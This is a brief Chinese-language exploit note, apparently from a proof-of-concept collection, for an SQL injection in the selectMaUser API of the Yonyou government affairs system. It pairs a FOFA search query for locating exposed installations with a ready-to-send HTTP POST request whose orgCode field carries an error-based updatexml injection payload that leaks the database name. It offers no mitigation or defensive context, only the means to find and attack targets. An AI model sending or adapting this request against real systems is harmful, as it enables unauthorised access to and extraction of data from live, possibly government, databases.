# 用友政务系统selectMaUser存在SQL注入

## fofa
```javascript
(body="eyeclose.png" && body="用友") || body="/df/access/public/pf/portal" || body="/pf/portal/login/css/foundation-datepicker.css" || body="/df/portal/getYearRgcode.do"
```

## poc
```javascript
POST /ma/api/selectMaUser HTTP/1.1
Host:
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.2307.6 Safari/537.36
Content-Length: 88

{"orgCode":"1' AND (updatexml(1,concat(0x7e,(select database()),0x7e),1)) AND '1'='1"}
```
